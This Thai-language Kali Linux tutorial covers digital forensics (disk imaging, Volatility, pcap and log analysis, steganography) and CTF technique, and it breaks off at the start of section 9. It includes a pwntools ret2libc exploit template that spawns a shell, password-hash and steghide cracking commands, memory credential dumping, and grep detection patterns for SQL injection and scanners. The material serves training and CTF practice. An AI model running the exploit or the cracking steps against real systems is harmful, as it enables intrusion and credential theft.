# Part 47: Digital Forensics และ CTF Techniques

> **หลักสูตร Kali Linux จาก Zero ถึง Professional**  
> Part 47 of 100+ | ระดับ: Advanced

---

## สารบัญ

1. [Digital Forensics คืออะไร](#1-digital-forensics-คืออะไร)
2. [Disk Imaging และ Evidence Preservation](#2-disk-imaging-และ-evidence-preservation)
3. [File System Forensics](#3-file-system-forensics)
4. [Memory Forensics ด้วย Volatility](#4-memory-forensics-ด้วย-volatility)
5. [Network Forensics](#5-network-forensics)
6. [Steganography](#6-steganography)
7. [CTF Challenge Types](#7-ctf-challenge-types)
8. [CTF Tools และ Techniques](#8-ctf-tools-และ-techniques)
9. [Log Analysis Forensics](#9-log-analysis-forensics)
10. [แบบฝึกหัด CTF Lab](#10-แบบฝึกหัด-ctf-lab)

---

## 1. Digital Forensics คืออะไร

### 1.1 ความหมายและขอบเขต

Digital Forensics คือกระบวนการเก็บรวบรวม วิเคราะห์ และนำเสนอหลักฐานดิจิทัลในรูปแบบที่เชื่อถือได้ทางกฎหมาย

**สาขาย่อย:**
```
┌─────────────────────────────────────────────────────────┐
│                   Digital Forensics                      │
├──────────────┬──────────────┬──────────────┬────────────┤
│    Disk      │   Memory     │   Network    │   Mobile   │
│  Forensics   │  Forensics   │  Forensics   │ Forensics  │
├──────────────┼──────────────┼──────────────┼────────────┤
│  Autopsy     │  Volatility  │  Wireshark   │  Cellebrite│
│  sleuthkit   │  rekall      │  NetworkMiner│  UFED      │
│  TestDisk    │  LiME        │  tcpdump     │  Andriller │
└──────────────┴──────────────┴──────────────┴────────────┘
```

### 1.2 Chain of Custody

```
หลักการสำคัญของ Forensics:

1. IDENTIFICATION   - ระบุหลักฐานที่ต้องเก็บ
2. PRESERVATION     - รักษาสภาพหลักฐานดั้งเดิม
3. COLLECTION       - เก็บรวบรวมอย่างถูกต้อง
4. ANALYSIS         - วิเคราะห์หลักฐาน
5. DOCUMENTATION    - บันทึกกระบวนการทุกขั้นตอน
6. PRESENTATION     - นำเสนอในรูปแบบที่เข้าใจได้
```

### 1.3 ติดตั้ง Tools

```bash
# ติดตั้ง Autopsy (GUI forensics tool)
sudo apt update
sudo apt install autopsy sleuthkit -y

# ติดตั้ง Volatility 3
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
pip3 install -r requirements.txt

# ติดตั้ง tools เพิ่มเติม
sudo apt install foremost scalpel binwalk exiftool steghide stegseek -y
sudo apt install wireshark tshark tcpdump -y
sudo apt install testdisk photorec -y
```

---

## 2. Disk Imaging และ Evidence Preservation

### 2.1 การสร้าง Disk Image

```bash
# สร้าง image ด้วย dd (raw format)
# XXXXXX = device เช่น /dev/sdb
sudo dd if=/dev/sdb of=/evidence/disk.img bs=512 status=progress

# ตรวจสอบ integrity ด้วย hash
md5sum /evidence/disk.img > /evidence/disk.img.md5
sha256sum /evidence/disk.img > /evidence/disk.img.sha256

# สร้าง image ด้วย dcfldd (มี hashing ในตัว)
sudo dcfldd if=/dev/sdb of=/evidence/disk.img hash=md5,sha256 \
    hashlog=/evidence/hash.log status=on

# สร้าง image ด้วย ewfacquire (E01 format)
sudo ewfacquire /dev/sdb
# จะได้ไฟล์ .E01 ซึ่งเป็น standard ในวงการ forensics

# Mount image แบบ read-only เพื่อวิเคราะห์
sudo mkdir /mnt/evidence
sudo mount -o ro,loop /evidence/disk.img /mnt/evidence

# Mount partition ใน image
# ดู partition table
fdisk -l /evidence/disk.img
# mount partition ที่ต้องการ (offset คือ sector * 512)
sudo mount -o ro,loop,offset=1048576 /evidence/disk.img /mnt/evidence
```

### 2.2 Write Blocker

```bash
# Software write blocker สำหรับ Linux
# ป้องกันการเขียนทับหลักฐาน

# วิธีที่ 1: hdparm
sudo hdparm -r1 /dev/sdb  # set read-only

# วิธีที่ 2: blockdev
sudo blockdev --setro /dev/sdb

# ตรวจสอบสถานะ
sudo blockdev --getro /dev/sdb
# output: 1 = read-only

# วิธีที่ 3: udev rule
# สร้างไฟล์ /etc/udev/rules.d/99-writeblock.rules
echo 'SUBSYSTEM=="block", ACTION=="add", RUN+="/bin/blockdev --setro %N"' \
    | sudo tee /etc/udev/rules.d/99-writeblock.rules
```

### 2.3 Autopsy - GUI Forensics

```bash
# เริ่ม Autopsy
autopsy &
# เปิด browser ไปที่ http://localhost:9999/autopsy

# ขั้นตอนการใช้งาน:
# 1. New Case → กรอกข้อมูล case
# 2. Add Host → ชื่อเครื่องที่สืบสวน  
# 3. Add Image → เพิ่ม disk image
# 4. เลือก analysis modules
# 5. วิเคราะห์ผลลัพธ์

# CLI ด้วย sleuthkit
# ดู file system type
fsstat /evidence/disk.img

# ดู inode ของไฟล์
ils /evidence/disk.img

# แสดง directory listing
fls -r /evidence/disk.img

# กู้คืนไฟล์ที่ถูกลบ
icat /evidence/disk.img INODE_NUMBER > recovered_file

# ค้นหาไฟล์ที่ถูกลบ
fls -d /evidence/disk.img  # -d = deleted files only
```

---

## 3. File System Forensics

### 3.1 File Carving

```bash
# ติดตั้ง foremost
sudo apt install foremost -y

# กู้คืนไฟล์ทุกประเภทจาก disk image
foremost -i /evidence/disk.img -o /recovery/

# กู้คืนเฉพาะประเภทที่ต้องการ
foremost -t jpg,pdf,docx -i /evidence/disk.img -o /recovery/

# ดูผลลัพธ์
ls /recovery/
cat /recovery/audit.txt

# Scalpel - เร็วกว่า foremost
sudo apt install scalpel -y
# แก้ไข config file
sudo nano /etc/scalpel/scalpel.conf
# uncomment ประเภทไฟล์ที่ต้องการ

scalpel /evidence/disk.img -o /recovery_scalpel/

# Binwalk - สำหรับ embedded systems/firmware
binwalk /evidence/firmware.bin

# Extract ไฟล์จาก binary
binwalk -e /evidence/firmware.bin

# กู้คืนด้วย photorec
photorec /evidence/disk.img
```

### 3.2 Metadata Analysis

```bash
# ExifTool - metadata ของไฟล์
exiftool image.jpg

# ดู metadata สำคัญ
exiftool -GPS* image.jpg       # GPS coordinates
exiftool -Author* document.pdf  # Author info
exiftool -CreateDate* file.*    # Creation date

# ดู metadata ทุก field
exiftool -a -u image.jpg

# ลบ metadata (สำหรับ privacy)
exiftool -all= image.jpg

# ค้นหาไฟล์ที่มี GPS data
exiftool -r -if '$GPSLatitude' /path/to/images/

# Strings - ดูข้อความใน binary file
strings malware.exe | grep -i 'http\|https\|password\|key'
strings -n 10 malware.exe  # minimum length 10

# File signatures (magic bytes)
file suspicious_file
hexdump -C suspicious_file | head -20
xxd suspicious_file | head -20

# ตัวอย่าง magic bytes:
# PNG:  89 50 4E 47 0D 0A 1A 0A
# JPG:  FF D8 FF
# PDF:  25 50 44 46
# ZIP:  50 4B 03 04
# ELF:  7F 45 4C 46
```

### 3.3 Timeline Analysis

```bash
# สร้าง timeline จาก file system
# mactime format: date|size|atime|mtime|ctime|inode|mode|uid|gid|filename

# สร้าง bodyfile
fls -m / -r /evidence/disk.img > /tmp/bodyfile.txt

# สร้าง timeline
mactime -b /tmp/bodyfile.txt -d > /tmp/timeline.csv

# กรอง timeline ตามช่วงเวลา
mactime -b /tmp/bodyfile.txt -d -z UTC '2024-01-01' '2024-01-31'

# ค้นหาเหตุการณ์สำคัญ
grep '2024-01-15' /tmp/timeline.csv | grep -i 'malware\|suspicious'

# Python script สำหรับ timeline analysis
python3 << 'EOF'
import csv
from datetime import datetime

interesting_paths = ['/tmp/', '/var/tmp/', '/dev/shm/']

with open('/tmp/timeline.csv') as f:
    reader = csv.reader(f)
    for row in reader:
        if len(row) >= 9:
            path = row[8] if len(row) > 8 else ''
            for suspect in interesting_paths:
                if suspect in path:
                    print(f"[!] SUSPICIOUS: {row[0]} - {path}")
EOF
```

---

## 4. Memory Forensics ด้วย Volatility

### 4.1 Memory Acquisition

```bash
# LiME (Linux Memory Extractor) - kernel module
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src
make

# load module และ dump memory
sudo insmod lime-$(uname -r).ko "path=/evidence/memory.lime format=lime"

# สำหรับ Windows - WinPmem
# winpmem_mini_x64_rc2.exe /proc /tmp/memory.raw

# สำหรับ VMware - snapshot .vmem file
# VMware สร้าง .vmem ไฟล์โดยอัตโนมัติเมื่อ snapshot
```

### 4.2 Volatility 3 - Linux

```bash
# ไปยัง directory ของ Volatility 3
cd /opt/volatility3

# ดู plugins ที่มีทั้งหมด
python3 vol.py --help | grep linux

# ดู OS profile
python3 vol.py -f /evidence/memory.lime banners.Banners

# ดู running processes
python3 vol.py -f /evidence/memory.lime linux.pslist
python3 vol.py -f /evidence/memory.lime linux.pstree

# ดู network connections
python3 vol.py -f /evidence/memory.lime linux.netstat
python3 vol.py -f /evidence/memory.lime linux.sockstat

# ดู loaded kernel modules
python3 vol.py -f /evidence/memory.lime linux.lsmod

# ค้นหา malware
python3 vol.py -f /evidence/memory.lime linux.malfind

# dump process memory
python3 vol.py -f /evidence/memory.lime linux.memmap --pid 1234 --dump

# ดู bash history ใน memory
python3 vol.py -f /evidence/memory.lime linux.bash

# ค้นหา strings ใน memory
python3 vol.py -f /evidence/memory.lime linux.strings | grep -i password
```

### 4.3 Volatility 3 - Windows

```bash
# Windows memory analysis

# ดู processes
python3 vol.py -f /evidence/win_memory.raw windows.pslist
python3 vol.py -f /evidence/win_memory.raw windows.pstree
python3 vol.py -f /evidence/win_memory.raw windows.psscan  # ค้นหา hidden processes

# ดู network connections
python3 vol.py -f /evidence/win_memory.raw windows.netstat

# ดู DLL ที่โหลด
python3 vol.py -f /evidence/win_memory.raw windows.dlllist --pid 1234

# ดู registry hives ใน memory
python3 vol.py -f /evidence/win_memory.raw windows.registry.hivelist
python3 vol.py -f /evidence/win_memory.raw windows.registry.printkey \
    --key "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

# ค้นหา malicious injections
python3 vol.py -f /evidence/win_memory.raw windows.malfind

# dump executable
python3 vol.py -f /evidence/win_memory.raw windows.dumpfiles --pid 1234

# ดู command history (cmd.exe)
python3 vol.py -f /evidence/win_memory.raw windows.cmdline
python3 vol.py -f /evidence/win_memory.raw windows.consoles  # ดู console output

# ค้นหา credentials ใน memory
python3 vol.py -f /evidence/win_memory.raw windows.hashdump
python3 vol.py -f /evidence/win_memory.raw windows.lsadump

# ดู handles
python3 vol.py -f /evidence/win_memory.raw windows.handles --pid 1234

# ดู clipboard
python3 vol.py -f /evidence/win_memory.raw windows.clipboard

# Timeline จาก memory
python3 vol.py -f /evidence/win_memory.raw timeliner.Timeliner
```

### 4.4 ตัวอย่าง: หา Malware ใน Memory

```bash
# ขั้นตอน 1: ดู suspicious processes
python3 vol.py -f memory.raw windows.psscan | tee processes.txt

# สังเกต:
# - Parent PID ที่ผิดปกติ (svchost.exe ที่ไม่มี parent เป็น services.exe)
# - Process ชื่อคล้าย system process (svch0st.exe, lsas.exe)
# - Process ที่ run จาก temp directory
python3 vol.py -f memory.raw windows.cmdline | grep -i temp

# ขั้นตอน 2: ตรวจสอบ network connections
python3 vol.py -f memory.raw windows.netstat | grep ESTABLISHED

# ขั้นตอน 3: malfind
python3 vol.py -f memory.raw windows.malfind | tee malfind.txt
# ดู memory regions ที่มี suspicious permissions (PAGE_EXECUTE_READWRITE)

# ขั้นตอน 4: dump process และวิเคราะห์
python3 vol.py -f memory.raw windows.dumpfiles --pid SUSPICIOUS_PID
# นำไป submit ใน VirusTotal หรือ analyze ด้วย strings/disassembler

# ขั้นตอน 5: ค้นหา IOCs
python3 vol.py -f memory.raw windows.strings | grep -E \
    '(http|https|ftp)://[^ ]+' > iocs.txt
```

---

## 5. Network Forensics

### 5.1 Packet Capture Analysis

```bash
# capture packets ด้วย tcpdump
sudo tcpdump -i eth0 -w /evidence/capture.pcap

# capture เฉพาะ traffic ที่ต้องการ
sudo tcpdump -i eth0 -w /evidence/http.pcap port 80 or port 443
sudo tcpdump -i eth0 -w /evidence/dns.pcap port 53

# Wireshark CLI (tshark)
# ดู packets
tshark -r /evidence/capture.pcap

# filter เหมือน Wireshark display filter
tshark -r capture.pcap -Y 'http.request'
tshark -r capture.pcap -Y 'dns'
tshark -r capture.pcap -Y 'ip.addr == 192.168.1.1'

# extract ข้อมูลสำคัญ
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port

# export HTTP objects (files transferred)
tshark -r capture.pcap --export-objects http,/tmp/http_exports

# ดู DNS queries
tshark -r capture.pcap -Y dns -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# ดู HTTP requests
tshark -r capture.pcap -Y 'http.request.method == GET' \
    -T fields -e http.host -e http.request.uri

# ดู credentials ใน plain text
tshark -r capture.pcap -Y 'ftp or telnet or http.authorization'
```

### 5.2 NetworkMiner

```bash
# ติดตั้ง NetworkMiner
sudo apt install networkminer -y

# หรือดาวน์โหลด Windows version
# https://www.netresec.com/?page=NetworkMiner

# NetworkMiner GUI:
# File → Open → เลือก pcap file
# Tabs: Hosts, Frames, Files, Images, Messages, Credentials, DNS
# 
# ดู:
# - Credentials tab: username/password ที่พบ
# - Files tab: files ที่ transfer ผ่าน network
# - DNS tab: domain lookups
```

### 5.3 Network Forensics Script

```python
#!/usr/bin/env python3
# network_analyzer.py - วิเคราะห์ pcap file

from scapy.all import *
from collections import Counter
import sys

def analyze_pcap(pcap_file):
    print(f"[*] กำลังวิเคราะห์: {pcap_file}")
    packets = rdpcap(pcap_file)
    
    ip_src_counter = Counter()
    ip_dst_counter = Counter()
    dns_queries = []
    http_hosts = []
    credentials = []
    
    for pkt in packets:
        # นับ IP
        if IP in pkt:
            ip_src_counter[pkt[IP].src] += 1
            ip_dst_counter[pkt[IP].dst] += 1
        
        # DNS queries
        if DNS in pkt and pkt[DNS].qr == 0:  # DNS query
            if pkt[DNS].qd:
                dns_queries.append(pkt[DNS].qd.qname.decode())
        
        # HTTP
        if TCP in pkt and pkt[TCP].dport == 80:
            if Raw in pkt:
                payload = pkt[Raw].load.decode(errors='ignore')
                if 'Host:' in payload:
                    for line in payload.split('\n'):
                        if line.startswith('Host:'):
                            http_hosts.append(line.strip())
                # ค้นหา credentials
                if 'password' in payload.lower() or 'passwd' in payload.lower():
                    credentials.append(payload[:200])
    
    print("\n[+] Top 10 Source IPs:")
    for ip, count in ip_src_counter.most_common(10):
        print(f"    {ip}: {count} packets")
    
    print("\n[+] Top 10 Destination IPs:")
    for ip, count in ip_dst_counter.most_common(10):
        print(f"    {ip}: {count} packets")
    
    print(f"\n[+] DNS Queries ({len(dns_queries)} total):")
    dns_counter = Counter(dns_queries)
    for domain, count in dns_counter.most_common(20):
        print(f"    {domain}: {count}")
    
    print(f"\n[+] HTTP Hosts:")
    for host in set(http_hosts):
        print(f"    {host}")
    
    if credentials:
        print(f"\n[!] Possible Credentials Found:")
        for cred in credentials:
            print(f"    {cred}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pcap_file>")
        sys.exit(1)
    analyze_pcap(sys.argv[1])
```

### 5.4 Log Analysis

```bash
# วิเคราะห์ Apache access log
cat /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head 20

# ค้นหา SQL injection attempts
grep -i 'union\|select\|insert\|drop\|or 1=1\|--' /var/log/apache2/access.log

# ค้นหา scanner signatures
grep -i 'nikto\|sqlmap\|nmap\|masscan' /var/log/apache2/access.log

# ค้นหา 404 errors (reconnaissance)
grep ' 404 ' /var/log/apache2/access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head 20

# วิเคราะห์ SSH auth log
grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# ค้นหา successful login
grep 'Accepted password' /var/log/auth.log

# วิเคราะห์ด้วย awk
awk '/Failed password/{ip[$11]++} END{for(i in ip) if(ip[i]>10) print ip[i], i}' \
    /var/log/auth.log | sort -rn

# Windows Event Log Analysis
# ดู Security events
wevtutil qe Security /f:text /c:100

# Event IDs สำคัญ:
# 4624 - Successful login
# 4625 - Failed login
# 4720 - User account created
# 4732 - User added to group
# 4648 - Explicit credential login
# 7045 - New service installed
```

---

## 6. Steganography

### 6.1 Image Steganography

```bash
# steghide - ซ่อน/หาข้อมูลใน JPEG/BMP/WAV/AU
# ซ่อนข้อมูล
steghide embed -cf image.jpg -sf secret.txt -p "password123"

# ดึงข้อมูลออก
steghide extract -sf image.jpg -p "password123"

# ดูข้อมูล metadata ใน steghide
steghide info image.jpg

# StegSeek - brute force steghide password
stegseek image.jpg /usr/share/wordlists/rockyou.txt

# zsteg - ค้นหา LSB steganography ใน PNG/BMP
gem install zsteg  # ติดตั้ง
zsteg image.png
zsteg -a image.png  # ลองทุก mode

# binwalk - ค้นหา embedded files
binwalk image.jpg
binwalk -e image.jpg  # extract
binwalk --dd='.*' image.jpg  # extract ทุกอย่าง

# strings ใน image
strings image.jpg | grep -v 'JFIF\|Exif'

# xxd และ hexdump
hexdump -C image.jpg | head -50
xxd image.jpg | grep -A2 -B2 'secret'

# outguess - อีก steganography tool
outguess -k password -r image.jpg output.txt  # extract
outguess -k password -d secret.txt input.jpg output.jpg  # embed

# jsteg (LSB in JPEG DCT)
jsteg reveal image.jpg output.txt
```

### 6.2 Audio Steganography

```bash
# Sonic Visualizer / Audacity - visual analysis
# เปิดไฟล์เสียง และดูที่ spectrogram view
# บางครั้งมีข้อความซ่อนใน spectrogram

# ติดตั้ง sonic visualizer
sudo apt install sonic-visualizer

# Deepsound (Windows tool)
# สามารถซ่อนไฟล์ใน MP3/WAV

# ตรวจสอบ metadata
exiftool audio.mp3

# SilentEye
sudo apt install silenteye
silenteye  # GUI tool

# LSB ใน WAV file
python3 << 'EOF'
import wave
import struct

def extract_lsb(wav_file):
    with wave.open(wav_file, 'r') as f:
        frames = f.readframes(f.getnframes())
    
    # แปลง bytes เป็น integers
    samples = struct.unpack(f'{len(frames)//2}h', frames)
    
    # เอา LSB ของแต่ละ sample
    bits = ''.join([str(s & 1) for s in samples])
    
    # แปลง bits เป็น characters
    chars = []
    for i in range(0, len(bits)-8, 8):
        byte = int(bits[i:i+8], 2)
        if byte == 0:
            break
        chars.append(chr(byte))
    
    return ''.join(chars)

result = extract_lsb('suspicious.wav')
print(f"Hidden message: {result}")
EOF
```

### 6.3 Text และ Other Steganography

```bash
# Unicode zero-width characters
# Zero-width space (U+200B), Zero-width joiner (U+200D) ซ่อนข้อมูลใน text

python3 << 'EOF'
def detect_zero_width(text):
    zero_width_chars = {
        '​': 'ZWS',
        '‌': 'ZWNJ', 
        '‍': 'ZWJ',
        '﻿': 'BOM',
        '⁠': 'WJ',
    }
    found = []
    for i, char in enumerate(text):
        if char in zero_width_chars:
            found.append(f"Position {i}: {zero_width_chars[char]}")
    return found

with open('suspicious_text.txt', 'r', encoding='utf-8') as f:
    text = f.read()

results = detect_zero_width(text)
if results:
    print("[!] Found zero-width characters:")
    for r in results:
        print(f"  {r}")
else:
    print("[-] No zero-width characters found")
EOF

# PDF steganography
# ซ่อนข้อมูลใน PDF layer
python3 -m pip install pikepdf

python3 << 'EOF'
import pikepdf

with pikepdf.open('document.pdf') as pdf:
    # ดู metadata
    print(pdf.docinfo)
    # ดู page count
    print(f"Pages: {len(pdf.pages)}")
    # ดู attachments
    if '/EmbeddedFiles' in pdf.Root:
        print("Found embedded files!")
EOF
```

---

## 7. CTF Challenge Types

### 7.1 ประเภทของ CTF

```
CTF Challenge Categories:

┌────────────────────────────────────────────────────────────┐
│  PWN        - Buffer overflow, format string, heap exploit  │
│  WEB        - SQLi, XSS, SSRF, RCE, deserialization         │
│  CRYPTO     - Caesar, RSA, AES, hash cracking, custom       │
│  FORENSICS  - Disk analysis, memory, network, steganography │
│  REVERSE    - Disassembly, decompilation, crackme           │
│  MISC       - OSINT, QR codes, encoding, logic puzzles      │
│  HARDWARE   - Firmware, IoT, signal analysis                │
└────────────────────────────────────────────────────────────┘

Flag format ตัวอย่าง:
  CTF{this_is_a_flag}
  flag{s3cr3t_v4lu3}
  picoCTF{h3ll0_w0rld}
```

### 7.2 Forensics CTF Techniques

```bash
# ขั้นตอนทั่วไปสำหรับ Forensics challenge

# 1. ดู file type
file challenge_file

# 2. ดู strings
strings challenge_file
strings -n 5 challenge_file | head -50

# 3. ตรวจสอบ magic bytes
hexdump -C challenge_file | head -10

# 4. ดู metadata
exiftool challenge_file

# 5. ค้นหา embedded files
binwalk challenge_file

# 6. ค้นหา hidden data
zsteg challenge_file  # สำหรับ PNG
steghide info challenge_file  # สำหรับ JPEG

# เทคนิค: ตรวจสอบ entropy
python3 << 'EOF'
import math
from collections import Counter

def file_entropy(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    
    if not data:
        return 0
    
    counter = Counter(data)
    entropy = 0
    for count in counter.values():
        p = count / len(data)
        entropy -= p * math.log2(p)
    
    return entropy

entropy = file_entropy('challenge_file')
print(f"Entropy: {entropy:.4f}")
if entropy > 7.5:
    print("[!] High entropy - likely encrypted or compressed")
elif entropy < 3.0:
    print("[!] Low entropy - likely text or has patterns")
EOF
```

### 7.3 Crypto CTF Techniques

```python
#!/usr/bin/env python3
# crypto_tools.py - เครื่องมือสำหรับ Crypto CTF

import base64
import string
from itertools import cycle

# 1. Caesar Cipher (ROT)
def caesar_decrypt(ciphertext, shift):
    result = ''
    for char in ciphertext:
        if char.isalpha():
            offset = 65 if char.isupper() else 97
            result += chr((ord(char) - offset - shift) % 26 + offset)
        else:
            result += char
    return result

# Brute force Caesar
def brute_force_caesar(ciphertext):
    print("Caesar brute force:")
    for i in range(26):
        print(f"  ROT{i:2d}: {caesar_decrypt(ciphertext, i)}")

# 2. XOR
def xor_decrypt(data, key):
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, str):
        key = key.encode()
    return bytes([d ^ k for d, k in zip(data, cycle(key))])

# XOR with single byte key brute force
def brute_force_xor(ciphertext):
    if isinstance(ciphertext, str):
        ciphertext = bytes.fromhex(ciphertext)
    
    results = []
    for key in range(256):
        decrypted = bytes([b ^ key for b in ciphertext])
        try:
            text = decrypted.decode('ascii')
            # ตรวจสอบว่ามี printable characters
            printable = sum(1 for c in text if c in string.printable)
            score = printable / len(text)
            if score > 0.8:
                results.append((score, key, text))
        except:
            pass
    
    results.sort(reverse=True)
    print("Top XOR results:")
    for score, key, text in results[:5]:
        print(f"  Key=0x{key:02X}: {text[:50]}")

# 3. Base encodings
def decode_all(data):
    encodings = {
        'base64': lambda d: base64.b64decode(d + '=='),
        'base32': lambda d: base64.b32decode(d + '===='),
        'base16': lambda d: base64.b16decode(d),
        'base58': None,  # ต้องติดตั้ง library เพิ่มเติม
    }
    
    for name, decoder in encodings.items():
        if decoder:
            try:
                result = decoder(data)
                print(f"  {name}: {result}")
            except:
                pass

# 4. Vigenere Cipher
def vigenere_decrypt(ciphertext, key):
    key = key.upper()
    result = ''
    key_idx = 0
    for char in ciphertext:
        if char.isalpha():
            offset = 65 if char.isupper() else 97
            shift = ord(key[key_idx % len(key)]) - 65
            result += chr((ord(char.upper()) - 65 - shift) % 26 + offset)
            key_idx += 1
        else:
            result += char
    return result

# 5. Frequency Analysis
def frequency_analysis(text):
    text = text.upper()
    freq = {}
    for char in text:
        if char.isalpha():
            freq[char] = freq.get(char, 0) + 1
    
    total = sum(freq.values())
    print("Frequency Analysis:")
    for char, count in sorted(freq.items(), key=lambda x: -x[1]):
        bar = '#' * int(count * 40 / total)
        print(f"  {char}: {bar} ({count/total*100:.1f}%)")
    print("  English: E(12.7) T(9.1) A(8.2) O(7.5) I(7.0) N(6.7)")

if __name__ == '__main__':
    # ตัวอย่าง
    ciphertext = "KHOOR ZRUOG"
    print("=== Caesar Brute Force ===")
    brute_force_caesar(ciphertext)
    
    print("\n=== Frequency Analysis ===")
    frequency_analysis(ciphertext)
```

### 7.4 Reverse Engineering CTF

```bash
# เครื่องมือ RE
sudo apt install ghidra radare2 gdb -y
pip3 install pwntools capstone keystone-engine

# Ghidra - NSA decompiler
# ดาวน์โหลดจาก https://ghidra-sre.org/
cd /opt/ghidra
./ghidraRun

# Radare2
r2 crackme_binary
# คำสั่งใน r2:
# aa        - analyze all
# afl       - list functions
# pdf @main - print disassembly of main
# V         - visual mode
# q         - quit

# GDB analysis
gdb ./crackme
# คำสั่ง:
# run       - รัน
# break main - set breakpoint
# next/step  - step
# info registers - ดู registers
# x/s 0xADDR - examine string
# x/20x $esp - examine stack

# strings analysis
strings crackme | grep -E 'flag|CTF|key|password'

# ltrace/strace
strace ./crackme  # system calls
ltrace ./crackme  # library calls

# ค้นหา hardcoded strings
objdump -s crackme | strings

# Python สำหรับ unpacking
python3 << 'EOF'
import struct

# ตัวอย่าง: ถอดรหัส custom encoding
encoded = b'\x41\x42\x43\x44'
key = 0x10
decoded = bytes([b ^ key for b in encoded])
print(decoded)
EOF
```

---

## 8. CTF Tools และ Techniques

### 8.1 Encoding และ Decoding

```bash
# CyberChef - Swiss Army Knife สำหรับ CTF
# ดาวน์โหลด: https://gchq.github.io/CyberChef/

# Python one-liners
# base64
echo 'SGVsbG8gV29ybGQ=' | base64 -d
python3 -c "import base64; print(base64.b64decode('SGVsbG8gV29ybGQ=').decode())"

# hex decode
echo '48656c6c6f' | xxd -r -p
python3 -c "print(bytes.fromhex('48656c6c6f').decode())"

# URL decode
python3 -c "from urllib.parse import unquote; print(unquote('%48%65%6c%6c%6f'))"

# ROT13
echo 'Uryyb Jbeyq' | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Caesar ทุก key
for i in $(seq 0 25); do
    echo -n "ROT$i: "
    echo 'KHOOR ZRUOG' | tr 'A-Za-z' "$(python3 -c \
        "s='ABCDEFGHIJKLMNOPQRSTUVWXYZ'; print(s[$i:]+s[:$i]+s[$i:].lower()+s[:$i].lower())")")
done

# Morse code decoder
python3 << 'EOF'
MORSE = {
    '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
    '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
    '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
    '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
    '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
    '--..': 'Z', '.----': '1', '..---': '2', '...--': '3',
    '....-': '4', '.....': '5', '-....': '6', '--...': '7',
    '---..': '8', '----.': '9', '-----': '0'
}

def decode_morse(morse):
    words = morse.strip().split('   ')
    return ' '.join(''.join(MORSE.get(c, '?') for c in w.split()) for w in words)

morse_input = '.... . .-.. .-.. ---   .-- --- .-. .-.. -..'
print(decode_morse(morse_input))
EOF
```

### 8.2 Hash Identification และ Cracking

```bash
# hash-identifier
hash-identifier
# ใส่ hash แล้วจะบอกประเภท

# hashid
hashid -m '5f4dcc3b5aa765d61d8327deb882cf99'
# -m แสดง hashcat mode

# Online hash crackers:
# https://crackstation.net/
# https://hashes.com/en/decrypt/hash
# https://md5decrypt.net/

# Hashcat สำหรับ CTF
# ดู mode list
hashcat --example-hashes | less

# crack MD5
hashcat -m 0 'hash_here' /usr/share/wordlists/rockyou.txt

# crack SHA256
hashcat -m 1400 'hash_here' /usr/share/wordlists/rockyou.txt

# crack SHA512crypt (Linux $6$)
hashcat -m 1800 '$6$salt$hash...' /usr/share/wordlists/rockyou.txt

# ถ้าเป็น custom encoding ก่อน hash
# เช่น base64(sha1(password))
python3 << 'EOF'
import hashlib, base64

def crack_custom(target, wordlist):
    with open(wordlist) as f:
        for line in f:
            word = line.strip()
            # ลอง custom hash
            h = base64.b64encode(hashlib.sha1(word.encode()).digest()).decode()
            if h == target:
                print(f"[+] Found: {word}")
                return word
    return None

result = crack_custom('W6ph5Mm5Pz8GgiULbPgzG37mj9g=', '/usr/share/wordlists/rockyou.txt')
EOF
```

### 8.3 PWN CTF Basics

```python
#!/usr/bin/env python3
# ctf_pwn_template.py - template สำหรับ PWN challenges

from pwn import *

# กำหนด target
target = './vulnerable_binary'  # local
# target = ('challenge.ctf.com', 1337)  # remote

# เริ่ม connection
# local
p = process(target)
# remote
# p = remote('challenge.ctf.com', 1337)

# context สำหรับ architecture
context.binary = ELF(target)
context.arch = 'amd64'  # หรือ 'i386'
context.log_level = 'debug'

# ค้นหา offset
# สร้าง cyclic pattern
pattern = cyclic(200)

# หา offset จาก crash
# gdb ./vulnerable_binary
# run < <(python3 -c "from pwn import *; print(cyclic(200))")
# ดู RIP/EIP value เมื่อ crash
# cyclic_find(0x6161616c)  # หา offset

offset = 72  # ค่าที่ได้จาก cyclic_find

# หา gadgets ด้วย ROPgadget
# ROPgadget --binary vulnerable_binary | grep 'pop rdi'

# สร้าง exploit
pop_rdi = 0x401234  # address ของ pop rdi; ret gadget
ret_gadget = 0x401235  # ret instruction

binary = ELF(target)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Stage 1: Leak LIBC address
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binary.got['puts'])  # address ของ puts ใน GOT
payload += p64(binary.plt['puts'])  # call puts
payload += p64(binary.symbols['main'])  # กลับมา main

p.sendlineafter(b'Input: ', payload)

# อ่าน leaked address
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"[+] Leaked puts @ {hex(leak)}")

libc.address = leak - libc.symbols['puts']
print(f"[+] LIBC base: {hex(libc.address)}")

# Stage 2: เรียก system("/bin/sh")
payload = b'A' * offset
payload += p64(ret_gadget)  # stack alignment
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendlineafter(b'Input: ', payload)

p.interactive()
```

---

## 9. Log Analysis Forensics

### 9.1 Windows Event Log Analysis

```bash
# Windows Event Logs ที่สำคัญ:
# Security.evtx      - authentication, authorization
# System.evtx        - system events
# Application.evtx   - application events
# Sysmon.evtx        - process, network (ต้องติดตั้ง Sysmon)

# อ่าน .evtx ด้วย python-evtx
